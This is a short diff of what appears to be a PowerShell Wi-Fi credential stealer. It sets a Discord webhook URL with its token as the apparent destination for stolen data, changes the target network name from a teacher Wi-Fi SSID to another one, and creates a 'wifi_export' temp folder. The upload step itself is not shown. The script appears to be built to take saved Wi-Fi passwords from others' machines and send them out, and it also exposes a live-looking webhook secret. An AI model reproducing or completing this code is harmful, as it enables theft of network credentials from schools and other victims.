@@ -1,5 +1,5 @@
 $hookUrl = "https://discordapp.com/api/webhooks/1465987971466395773/oYnAK6pdTATSbadnkw-2fraAguGL88gI9NIlKnXijZlkFMeiDmgtgq-VevctXFzQ4C9O"
-$ssid = "Teacher_WiFi_R"
+$ssid = "netis_mesh_2G"
 
 $tempPath = Join-Path $env:TEMP "wifi_export"
 New-Item -ItemType Directory -Path $tempPath -Force | Out-Null
